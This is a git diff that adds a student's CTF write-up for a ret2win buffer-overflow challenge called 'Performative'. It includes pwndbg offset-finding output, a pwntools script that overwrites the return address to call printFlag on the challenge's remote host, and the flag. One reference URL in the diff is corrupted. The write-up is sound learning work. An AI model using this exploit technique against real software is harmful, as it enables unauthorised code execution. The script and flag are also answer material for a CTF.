@@ -62,5 +62,101 @@ From this challenge, I got a brief intro C++, and some very basic understanding 
 ### References
 - https://drive.google.com/drive/u/0/folders/16O68-jD2Vhyfwpcf6zaspXlo7LgtKo9E?ths=true
 - https://www.w3schools.com/cpp/cpp_syntax.asp
-- https://r1ru.github.io/categories/binary-exploitation-101
+- hPerttps://r1ru.github.io/categories/binary-exploitation-101
 -----------------------------------------------------------------------------------------------------------------------------------
+## Performative 
+To solve this challenge, we needed to figure out the exact buffer overflow which would allow us to call the `printFlag` function.
+
+### Solution 
+To solve this challenge, I followed the steps as below: 
+- I first downloaded the ELF file which was available to us in the Google Drive. I then put it in Ghidra to analyze the code. On reading the `main()` in the debugged code, I saw that there was a vulnerability in the code where it takes the input.
+```bash
+ __isoc23_scanf(&DAT_00402013,buffer);
+```
+- Now in this, I could see that we can cause an overflow which would allow us to overwrite the return address, so this became a `Ret2Win`.
+- On analyzing the function I learned that I needed to calculate the offset of the address that is called when the return line executes. I actually learned a new thing here by learning something called as `cyclic`. This allowed me to calculate the offset pretty quickly and easily.
+
+```bash
+pwndbg> cyclic 50 
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
+pwndbg> run 
+Starting program: /home/ishaan-mishra/Downloads/src/perf 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+### Welcome to the performative male/female parade! ###
+
+Yk what performative people like? just a plain ol' bof!
+
+Lets just generate a buffer then ig?
+
+Buffer: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
+Generating your buffer...
+
+Your custom buffer:
+========================
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000004013b2 in main (argc=1, argv=0x7fffffffde78)
+    at perf.c:68
+.
+.
+.
+────────────────────────────[ STACK ]─────────────────────────────
+00:0000│ rsp 0x7fffffffdd58 ◂— 'faaaaaaaga'
+01:0008│     0x7fffffffdd60 ◂— 0x7fffff006167 /* 'ga' */
+02:0010│     0x7fffffffdd68 —▸ 0x7fffffffde78 —▸ 0x7fffffffe1be ◂— '/home/ishaan-mishra/Downloads/src/perf'
+03:0018│     0x7fffffffdd70 ◂— 0x100400040 /* '@' */
+04:0020│     0x7fffffffdd78 —▸ 0x4012db (main) ◂— push rbp
+05:0028│     0x7fffffffdd80 —▸ 0x7fffffffde78 —▸ 0x7fffffffe1be ◂— '/home/ishaan-mishra/Downloads/src/perf'
+06:0030│     0x7fffffffdd88 ◂— 0x94d6d47fca28018d
+07:0038│     0x7fffffffdd90 ◂— 1
+```
+- Using this I was able to see clearly that the offset for getting to the Return address was 40 bytes(5x8).
+- Next what I did was I went around looking for the function which prints the flag. I found the function `printFlag` at the memory address `0x4011e9`.
+- All that was left to do was create a script, and deliver the payload as needed. The script is as shown below:
+```bash
+from pwn import *
+
+p = remote('performative.nitephase.live', 56743)
+print_flag_addr = 0x4011e9
+offset = 40
+payload = b'A' * offset + p64(print_flag_addr)
+p.recvuntil(b'Buffer: ')
+p.sendline(payload)
+p.interactive()
+
+```
+- On running this script, I got the flag as shown below:
+```bash
+ ⚙  Mon  1 Dec - 12:41  ~/Downloads/src 
+ @ishaan-mishra  python3 solve.py
+[+] Opening connection to performative.nitephase.live on port 56743: Done
+[*] Switching to interactive mode
+Generating your buffer...
+
+Your custom buffer:
+========================
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe9@
+nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}
+[*] Got EOF while reading in interactive
+$  [3]  + 18889 suspended (signal)  python3 solve.py
+
+```
+
+### Flag 
+
+`nite{th3_ch4l_4uth0r_15_4nt1_p3rf0rm4t1v3}`
+
+### What I learned 
+
+This was the first challenge I solved after EndSems, so this served as a really good revision for all I knew and learned. I learned about using `cyclic` to generate offsets which was becoming a really annoying thing for me at times. Apart from that, I got more comfortable using GDB to gain various inputs and data. 
+
+### Notes
+This challenge did take a long time as I was out of touch with the tools. But it is a great thing overall. 
+
+### References 
+- https://r1ru.github.io/categories/binary-exploitation-101/
+- https://drive.google.com/drive/u/1/folders/1nc2RX2paLHo8lKn7lF0ox0HXmqpEW9-A?ths=true
+- https://www.sourceware.org/gdb/documentation/
+----------------------------------------------------------------------------------------------------------------------------------
